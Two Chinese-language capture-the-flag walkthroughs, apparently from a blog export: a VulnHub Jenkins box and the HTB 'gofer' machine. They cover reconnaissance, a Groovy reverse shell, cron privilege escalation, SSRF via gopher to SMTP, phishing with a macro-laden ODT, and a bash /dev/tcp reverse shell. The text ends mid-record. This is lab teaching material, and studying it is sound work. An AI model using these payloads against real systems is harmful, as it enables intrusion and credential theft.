nmap -sn 192.168.56.0/24map 7.93 ( https://nmap.org ) at 2023-04-15 04:27 EDTNmap scan report for 192.168.56.2Host is up (0.00062s latency).Nmap scan report for 192.168.56.132Host is up (0.0013s latency).Nmap scan report for 192.168.56.134Host is up (0.0031s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 2.57 seconds\n\n目标发现：192.168.56.134\n\nnmap -p- --min-rate=10000端口扫描\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.134Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:30 EDTNmap scan report for 192.168.56.134Host is up (0.00087s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http3306/tcp open  mysql8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 3.42 seconds\n\n22，80，3306，8080端口开放。\n\nTCP扫描，服务检测，操作系统识别\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.56.134[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:31 EDTNmap scan report for 192.168.56.134Host is up (0.00062s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)3306/tcp open  mysql   MariaDB (unauthorized)8080/tcp open  http    Jetty 9.4.z-SNAPSHOTMAC Address: 00:0C:29:D4:0A:9B (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds\n\n看起来80和8080好下手，且8080开放的服务版本也识别出来了：Jetty 9.4.z-SNAPSHOT。\n\n漏洞扫描\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.56.134Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 04:36 EDTNmap scan report for 192.168.56.134Host is up (0.00062s latency).PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http| http-enum: |_  /icons/: Potentially interesting folder w/ directory listing|_http-trace: TRACE is enabled|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.3306/tcp open  mysql8080/tcp open  http-proxy| http-enum: |_  /robots.txt: Robots fileMAC Address: 00:0C:29:D4:0A:9B (VMware)Nmap done: 1 IP address (1 host up) scanned in 35.09 seconds\n\n可以看看8080的robots.txt文件，其他没啥有用信息。\n\n\n80与8080端口\n先浏览器访问192.168.56.134以及192.168.56.134:8080。\n\n80端口运行着一个奇奇怪怪的网页，有个登录框，随便尝试登录发现跳转不正常，会失败。点击网页其他的连接地址也会错误跳转。单从网页上没啥有用信息。\n\n看看8080吧家人们。发现是个Jenkins的后台登录页面，网页底部还写了jenkins版本是2.1.13，直接searchsploir没找到有用exp。先放着。同时，8080运行的Jetty版本也有了，一起搜一搜，还是没啥能用的漏洞。\n\n回旋！没啥有用信息，先试试网页目录发现。\n\n直接上feroxbuster\n#### content discovery```bash┌──(kali㉿kali)-[~]└─$ sudo feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401  ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.9.1───────────────────────────┬────────────────────── 🎯  Target Url            │ http://192.168.56.134 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌  Status Codes          │ [200, 301, 302, 401] 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.9.1 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200      GET      404l     1784w    32906c http://192.168.56.134/[####################] - 33s   220546/220546  0s      found:1       errors:0      [####################] - 32s   220546/220546  6798/s  http://192.168.56.134/ ```\n\n什么也没找到，奇了怪了，事出反常必有妖。在网页点击几个链接，发现使用php写的，尝试指定文件后缀重新发现。\n-x php,html\n┌──(kali㉿kali)-[~]└─$ sudo feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -s 200,301,302,401  ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.9.1───────────────────────────┬────────────────────── 🎯  Target Url            │ http://192.168.56.134 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌  Status Codes          │ [200, 301, 302, 401] 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.9.1 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 💲  Extensions            │ [php, html] 🏁  HTTP methods          │ [GET] 🔃  Recursion Depth       │ 4 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200      GET      404l     1784w    32906c http://192.168.56.134/200      GET      404l     1784w    32906c http://192.168.56.134/index.html200      GET       13l       28w      359c http://192.168.56.134/access.html[####################] - 1m    661638/661638  0s      found:3       errors:0      [####################] - 1m    661638/661638  6456/s  http://192.168.56.134/\n\n访问access.html，发现了加密的登录凭证。\n# http://192.168.56.134/access.htmlCreds encrypted in a safe way!tiago:5978a63b4654c73c60fa24f836386d87trindade:f463f63616cb3f1e81ce46b39f882fd5-----mariannaeder:9b38e2b1e8b12f426b0d208a7ab6cb98-----vipsu# hash-indentify 发现最可能是md5加密# 使用crackstation解密，发现是LM类型加密tiago:italia99trindade:mariannaeder:vipsu\n\n另说一句，目录发现8080端口能发现一些文件夹，但是无效信息，没用。\n\n根据以上获得的登录凭证，尝试ssh登录，全都失败，再尝试登录jenkins后台，发现eder:vipsu可以成功进入后台。\n\n\n漏洞利用\njenkins一眼存在错误配置导致的RCE漏洞。进入/script页面，从PayloadAllTheThing上搜一搜groovy script的reverse shell payload。填入框中点击run。\n// Groovy script payloadString host=&quot;192.168.56.132&quot;;int port=4444;String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();\n\n\n\n\n\n成功拿到jenkins的shell。\n\n\n提权\n遇事不决sudo -l，要密码，歇逼。\n\n看看SUID，find / -type f -perm -04000 -ls 2&gt;/dev/null,没啥有用的。\n\n三板斧之cronjob，看看crontab。\n\n发现/etc/script下有个CleaningScript.sh命令脚本，*/5说明其每5分钟运行一次。\nls -la发现其权限竟然是777且所有者是root。完美，我们向里面写入我们的reverse shel。\n\n\n在本机使用nc监听，到整数5分钟时。接收到了root shell。\n\n\n看看flag\n\n\n\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[HTB]  gofer","url":"/2023/08/05/gofer/","content":"\n\n\n前言懒得写了。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.225Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:22 EDTNmap scan report for 10.10.11.225Host is up (0.075s latency).Not shown: 65530 closed tcp ports (reset)PORT    STATE    SERVICE22/tcp  open     ssh25/tcp  filtered smtp80/tcp  open     http139/tcp open     netbios-ssn445/tcp open     microsoft-dsNmap done: 1 IP address (1 host up) scanned in 11.06 seconds$ sudo nmap -sT -sV -sC -O -p22,25,80,139,445 10.10.11.225Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:24 EDTNmap scan report for 10.10.11.225Host is up (0.074s latency).PORT    STATE    SERVICE     VERSION22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)25/tcp  filtered smtp80/tcp  open     http        Apache httpd 2.4.56|_http-title: Did not follow redirect to http://gofer.htb/|_http-server-header: Apache/2.4.56 (Debian)139/tcp open     netbios-ssn Samba smbd 4.6.2445/tcp open     netbios-ssn Samba smbd 4.6.2Warning: OSScan results may be unreliable because we could not find at least 1 open and 1Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linnux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time:|   date: 2023-08-04T06:24:34|_  start_date: N/A|_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required|_clock-skew: 10sOS and Service detection performed. Please report any incorrect results at https://nmap.orNmap done: 1 IP address (1 host up) scanned in 27.81 seconds$ sudo nmap --script=vuln 10.10.11.225Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:26 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for gofer.htb (10.10.11.225)Host is up (0.078s latency).Not shown: 995 closed tcp ports (reset)PORT    STATE    SERVICE22/tcp  open     ssh25/tcp  filtered smtp80/tcp  open     http|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-fileupload-exploiter:||     Couldn&#x27;t find a file-type field.||_    Couldn&#x27;t find a file-type field.| http-csrf:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=gofer.htb|   Found the following possible CSRF vulnerabilities:||     Path: http://gofer.htb:80/|     Form id:|     Form action:||     Path: http://gofer.htb:80/index.html|     Form id:|_    Form action:|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.139/tcp open     netbios-ssn445/tcp open     microsoft-dsHost script results:|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less datsing); aborting [9]|_smb-vuln-ms10-054: false|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned lare missing); aborting [9]Nmap done: 1 IP address (1 host up) scanned in 89.27 seconds\n\n25端口被filter了，可能是防火墙啥的。80开着可以看看，139和445的smb服务肯定是第一个要看的。那么大体路径就是这样了。\nwhatweb$ sudo whatweb 10.10.11.225[sudo] password for meamea:http://10.10.11.225 [301 Moved Permanently] Apache[2.4.56], Country[RESERVED][ZZ], HTTPSer1.225], RedirectLocation[http://gofer.htb/], Title[301 Moved Permanently]ERROR Opening: http://gofer.htb/ - no address for gofer.htb$ sudo vim /etc/hosts$ sudo whatweb http://gofer.htbhttp://gofer.htb [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@gofe/2.4.56 (Debian)], IP[10.10.11.225], Lightbox, Script, Title[Gofer]\n\n我们把域名加到hosts里面。\nnikto$ sudo nikto -h http://gofer.htb- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.225+ Target Hostname:    gofer.htb+ Target Port:        80+ Start Time:         2023-08-04 02:26:53 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.56 (Debian)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.ms+ /: The X-Content-Type-Options header is not set. This could allow the user agent to rendthe MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/m+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /: Server may leak inodes via ETags, header found with file /, inode: 72c4, size: 5fa663in/cvename.cgi?name=CVE-2003-1418+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time:           2023-08-04 02:37:23 (GMT-4) (630 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n没啥信息。\nsmb渗透$ smbmap -H 10.10.11.225[+] IP: 10.10.11.225:445        Name: gofer.htb        Disk             Permissions     Comment        ----             -----------     -------        print$           NO ACCESS       Printer Drivers        shares           READ ONLY        IPC$             NO ACCESS       IPC Service (Samba 4.13.13-Debian)\n\nsmbmap先扫一下都共享了哪些目录以及哪些目录是可以访问的。我们发现shares可以读，我们直接连接看看。\n$ smbclient \\\\\\\\10.10.11.225\\\\sharesPassword for [WORKGROUP\\me]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Fri Oct 28 15:32:08 2022  ..                                  D        0  Fri Apr 28 07:59:34 2023  .backup                            DH        0  Thu Apr 27 08:49:32 2023                5061888 blocks of size 1024. 2164028 blocks availablesmb: \\&gt; cd .backup\\smb: \\.backup\\&gt; ls  .                                   D        0  Thu Apr 27 08:49:32 2023  ..                                  D        0  Fri Oct 28 15:32:08 2022  mail                                N     1101  Thu Apr 27 08:49:32 2023                5061888 blocks of size 1024. 2164008 blocks availablesmb: \\.backup\\&gt; get mailgetting file \\.backup\\mail of size 1101 as mail (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)smb: \\.backup\\&gt; exit\n\n我们发现有封邮件，直接下载下来看看内容。\nFrom jdavis@gofer.htb  Fri Oct 28 20:29:30 2022Return-Path: &lt;jdavis@gofer.htb&gt;X-Original-To: tbuckley@gofer.htbDelivered-To: tbuckley@gofer.htbReceived: from gofer.htb (localhost [127.0.0.1])        by gofer.htb (Postfix) with SMTP id C8F7461827        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)Subject:Important to read!Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)From: jdavis@gofer.htbHello guys,Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. From  now on, I&#x27;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt forma saved in Office Word are not always well interpreted by Libreoffice.PS: Last thing for Tom; I know you&#x27;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seet should be possible to do so via &lt;Limit&gt;\n\n省流一下，邮件主要有几个值得注意的点：\n\nJocelyn最近又收到了钓鱼邮件，并且她（我就是要假定性别）有喜欢乱点链接的习惯。\n之后在内部传文件会用邮件传并且最好要求是.odt格式的文件\nTom正在搞网页代理，并且他的访问限制可能做的不是特别严格。\n邮件中的名字都有可能是用户名，可以留意一下，例如tbuckley、jdavis、Jocelyn、Tom。\n\n其中第3条的网页代理提示我们可能存在子域名，其他信息目前还不知道有没有用，接着看吧。\nweb渗透访问网站\n进网页看了一圈也没啥有用的。那就目录扫描和FUZZ一下子域名看看。\n目录扫描$ sudo feroxbuster -u http://gofer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x odt -n ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓                 ver: 2.10.0───────────────────────────┬────────────────────── 🎯  Target Url            │ http://gofer.htb 🚀  Threads               │ 50 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌  Status Codes          │ All Status Codes! 💥  Timeout (secs)        │ 7 🦡  User-Agent            │ feroxbuster/2.10.0 💉  Config File           │ /etc/feroxbuster/ferox-config.toml 🔎  Extract Links         │ true 💲  Extensions            │ [odt] 🏁  HTTP methods          │ [GET] 🚫  Do Not Recurse        │ true───────────────────────────┴────────────────────── 🏁  Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200      GET       81l      197w     2590c http://gofer.htb/assets/vendor/php-email-form/validate.js200      GET        7l       27w     3309c http://gofer.htb/assets/img/apple-touch-icon.png200      GET      621l     2087w    29380c http://gofer.htb/index.html200      GET      237l      526w     5700c http://gofer.htb/assets/js/main.js200      GET        9l       23w      847c http://gofer.htb/assets/img/favicon.png200      GET       90l      527w    40608c http://gofer.htb/assets/img/testimonials/testimonials-5.jpg200      GET      130l      463w    27174c http://gofer.htb/assets/img/portfolio/portfolio-8.jpg200      GET        1l      233w    13749c http://gofer.htb/assets/vendor/glightbox/css/glightbox.min.css200      GET       88l      408w    36465c http://gofer.htb/assets/img/testimonials/testimonials-4.jpg200      GET       13l      171w    16468c http://gofer.htb/assets/vendor/swiper/swiper-bundle.min.css200      GET      261l     1188w    94694c http://gofer.htb/assets/img/about-img.jpg200      GET      259l     1656w   147504c http://gofer.htb/assets/img/portfolio/portfolio-5.jpg200      GET      187l      991w    87460c http://gofer.htb/assets/img/team/team-4.jpg200      GET        1l      133w    68028c http://gofer.htb/assets/vendor/boxicons/css/boxicons.min.css200      GET      369l     2025w   164200c http://gofer.htb/assets/img/team/team-2.jpg200      GET      147l      628w    44741c http://gofer.htb/assets/img/portfolio/portfolio-6.jpg200      GET     1535l     3031w    26660c http://gofer.htb/assets/css/style.css200      GET       14l     1684w   143629c http://gofer.htb/assets/vendor/swiper/swiper-bundle.min.js200      GET        1l      313w    14690c http://gofer.htb/assets/vendor/aos/aos.js301      GET        9l       28w      307c http://gofer.htb/assets =&gt; http://gofer.htb/assets/200      GET      160l      818w    71959c http://gofer.htb/assets/img/testimonials/testimonials-1.jpg200      GET        1l      625w    55880c http://gofer.htb/assets/vendor/glightbox/js/glightbox.min.js200      GET      148l      914w    83895c http://gofer.htb/assets/img/portfolio/portfolio-2.jpg200      GET      246l     1284w   100163c http://gofer.htb/assets/img/portfolio/portfolio-3.jpg200      GET      345l     1897w   135739c http://gofer.htb/assets/img/portfolio/portfolio-1.jpg200      GET        7l     2189w   194901c http://gofer.htb/assets/vendor/bootstrap/css/bootstrap.min.css200      GET      316l     1853w   153340c http://gofer.htb/assets/img/team/team-1.jpg200      GET      247l     1374w    99927c http://gofer.htb/assets/img/team/team-3.jpg200      GET       71l      380w    30729c http://gofer.htb/assets/img/testimonials/testimonials-3.jpg200      GET        1l      218w    26053c http://gofer.htb/assets/vendor/aos/aos.css200      GET      488l     2828w   220492c http://gofer.htb/assets/img/portfolio/portfolio-7.jpg200      GET      244l     1332w   103224c http://gofer.htb/assets/img/testimonials/testimonials-2.jpg200      GET      120l      567w    48988c http://gofer.htb/assets/img/portfolio/portfolio-4.jpg200      GET       12l      557w    35445c http://gofer.htb/assets/vendor/isotope-layout/isotope.pkgd.min.js200      GET     1876l     9310w    88585c http://gofer.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css200      GET      238l     1343w   105633c http://gofer.htb/assets/img/portfolio/portfolio-9.jpg200      GET        7l     1223w    80496c http://gofer.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js200      GET      621l     2087w    29380c http://gofer.htb/[####################] - 12m   220605/220605  0s      found:38      errors:7[####################] - 12m   220546/220546  318/s   http://gofer.htb/\n\n没发现啥有用的。\n子域名FUZZ$ wfuzz -H &quot;Host: FUZZ.gofer.htb&quot; --hc 404,403 --hw 28 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://gofer.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://gofer.htb/Total requests: 4989=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000084:   401        14 L     54 W       462 Ch      &quot;proxy&quot;Total time: 40.14814Processed Requests: 4989Filtered Requests: 4988Requests/sec.: 124.2647\n\n这个proxy多半就是tom弄的网页代理了，我们把它加入hosts后再访问。\nproxy访问一下看看。\n\n上来就让我们登录，简单用之前发现的用户名尝试一下弱密码，都没成功。想起之前邮件提到说访问限制做的不好。访问限制做的不好很可能导致马奇诺防线，意思是可能只针对一种请求方式做了严格限制，对其他的请求方式没做限制。\n我们试试其他请求方式看看。\n\n然而全都报了401未授权，我们再试试直接访问页面试试，我们通过wappalyzer发现网站使用php写的。\n\n那我们访问index.php默认页面试试。\n\n果然，报200了，绕过授权了，但是提示确实URL参数，我们加上试试看。\n我们直接尝试http://proxy.gofer.htb/index.php?url=127.0.0.1\n好家伙，直接返回了80端口的web主页，得，妥妥的SSRF漏洞。\nSSRF利用既然已经验证ssrf存在，我们直接上手利用,用curl其实比较方便，继续用火狐也行。\n$ curl proxy.gofer.htb/index.php?url=file:///etc/passwd -X POST&lt;!-- Welcome to Gofer proxy --&gt;&lt;html&gt;&lt;body&gt;Blacklisted keyword: file:// !&lt;/body&gt;&lt;/html&gt;\n\n想试试LFI的，可惜明显过滤了file协议，其他常用的协议还有gofer、dict以及http等。突然发现了华点，这台机子不就叫gofer吗，暗示我们该用gofer协议？gofer协议主要用于发送GET以及POST请求以及攻击内网应用。\n我们有攻击内网应用的需求吗？被filter的25端口smtp呗。显然smtp只能在内网使用，刚好我们可以通过ssrf伪造成服务器在内部发邮件。回忆之前的邮件内容，是时候再钓一钓喜欢乱点链接的Jocelyn的鱼咯。\n钓鱼邮件构造我们直接搜索ssrf smtp gofer就会出来一堆利用教程，附一点相关资料：hacktricks、github。或者我们可以使用Gopherus这个工具生成pyload。\n$ gopherus --exploit smtp  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\\    \\_\\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \\  ___/|  | \\/  |  /\\___ \\ \\______  /\\____/|   __/|___|  /\\___  &gt;__|  |____//____  &gt;        \\/       |__|        \\/     \\/                 \\/                author: $_SpyD3r_$Give Details to send mail:Mail from :  jdavis@gofer.htbMail To :  jocelyn@gofer.htbSubject :  Important!Message :  &lt;a href=&quot;http://&lt;HTB_VPN_IP&gt;:19198/door.sh&quot;&gt;read&lt;/a&gt;Your gopher link is ready to send Mail:gopher://127.0.0.1:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jocelyn%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:Important%21%0AMessage:%3Ca%20href%3D%22http://&lt;HTB_VPN_IP&gt;:19198/door.sh%22%3Eread%3C/a%3E%0A.\n\n直接用这个paylod你会发现/127也在黑名单里面，好在ssrf绕过里面好多对本地地址的绕过，我们可以使用10进制的地址2130706433，一样是代表127.0.0.1。\ndoor.sh的内容其实就是反弹shell的命令:/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/11451 0&gt;&amp;1\n然后payload的内容要经过URL编码，不然没反应。\n我们尝试一下\n$ curl proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Atest%2540test.htb%250ARCPT%2520To%3Ajocelyn%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%2521%250AMessage%3A%253Ca%2520href%253D%2522http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fdoor.sh%2522%253Eread%253C%2Fa%253E%250A. -X POST&lt;!-- Welcome to Gofer proxy --&gt;220 gofer.htb ESMTP Postfix (Debian/GNU)250 2.1.0 Ok550 5.1.1 &lt;jocelyn@gofer.htb&gt;: Recipient address rejected: User unknown in local recipient table554 5.5.1 Error: no valid recipients221 2.7.0 Error: I can break rules, too. Goodbye.1\n\n提示没有收件人，何意啊。。。她不就叫jocelyn吗。观察了一下开始那封邮件，发件人叫jdavis，我们去官网看看他是不是就叫这个。\n\n草，原来是缩写。Tom Buckley的用户名确实也是tbuckley，所以Jocelyn Hudson的用户名应该叫jhudson。改完试试看。\n$ curl proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Ajdavis%2540gofer.htb%250ARCPT%2520To%3Ajhudson%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%2521%250AMessage%3A%253Ca%2520href%253D%2522http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fdoor.sh%2522%253Eread%253C%2Fa%253E%250A. -X POST\n\n我们在本地起一个http服务器并开一个nc端口监听，然后我们就会发现Jocelyn确实点了链接，然而却没能给我们反弹shell。可能做了限制，结合之前邮件，可能只有在邮件里传.odt文件他们才会打开。\n恶意odt文件构造本来先尝试用msf的exploit/multi/fileformat/libreoffice_macro_exec构造的文件，可惜传上去怎么都不能成功拿到shell，我不知道是哪里出了问题。\n再搜了搜看看，发现有文章详细介绍了如何手动构造恶意odt文件。\n步骤：\n\n打开libreoffice，选择工具–&gt;宏–&gt;管理宏–&gt;使用Basic语言\n\n按文章那样利用Shell()函数构造反弹shell，但是其实不用像文章那样分三步这么麻烦。还有要注意的是，外面一定要套一个bash -c，不然收不到shell，很搞。\n\n宏写好后，要在自定义里面指定在文件打开时自动执行我们的宏。\n\n\n保存，ok力。\n\n\n获取立足点$ curl -X POST proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Ajdavis%2540gofer.htb%250ARCPT%2520To%3Ajhudson%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%250AMessage%3A%253Ca%2520href%253D%2522%2520http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fexp.odt%2520%2522%253Eread%253C%2Fa%253E%250A.\n\n$ python -m http.server 19198Serving HTTP on 0.0.0.0 port 19198 (http://0.0.0.0:19198/) ...10.10.11.225 - - [04/Aug/2023 13:28:50] &quot;GET /exp.odt HTTP/1.1&quot; 200 -\n\n$ sudo nc -nlvp 11451listening on [any] 11451 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.225] 34542bash: cannot set terminal process group (4974): Inappropriate ioctl for devicebash: no job control in this shellbash: /home/jhudson/.bashrc: Permission deniedjhudson@gofer:/usr/bin$\n\n成功拿下，user flag在home目录下。\n提权pspy64获取信息sudo用不了。\n查找s位程序倒是有发现。\njhudson@gofer:/usr/bin$ find / -type f -perm -04000 2&gt;/dev/nullfind / -type f -perm -04000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1/usr/bin/fusermount/usr/bin/mount/usr/bin/passwd/usr/bin/umount/usr/bin/gpasswd/usr/bin/chsh/usr/bin/pkexec/usr/bin/su/usr/bin/chfn/usr/bin/newgrp/usr/local/bin/notesYou have mail in /var/mail/jhudsonjhudson@gofer:/usr/bin$ ls -la /usr/local/bin/notesls -la /usr/local/bin/notes-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notesjhudson@gofer:/usr/bin$ ididuid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)\n\n然而jhudson并不是dev组的，研究不了这个notes，我们看看能不能想办法提权到dev组用户。\ncrontab也没有有意思的。\n例行公事，pspy64和linpeas看一看。\n\n等了一段时间，pspy64直接传回捷报，有一串tbuckley的登陆凭证，虽然不知道是不是，我们直接试试ssh登录看看，发现能成功登录，赢！\n$ ssh tbuckley@10.10.11.225tbuckley@10.10.11.225&#x27;s password:Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have no mail.tbuckley@gofer:~$ iduid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)\n\n好巧不巧的是，tbuckley刚好是dev组的，那不撞枪口上了，直接研究一下notes。\n逆向notes我们首先执行一下看看。\ntbuckley@gofer:/usr/local/bin$ ls -latotal 28drwxr-xr-x  2 root root  4096 Apr 28 16:06 .drwxr-xr-x 10 root root  4096 Oct 28  2022 ..-rwsr-s---  1 root dev  17168 Apr 28 16:06 notestbuckley@gofer:/usr/local/bin$ ./notes========================================1) Create an user and choose an username2) 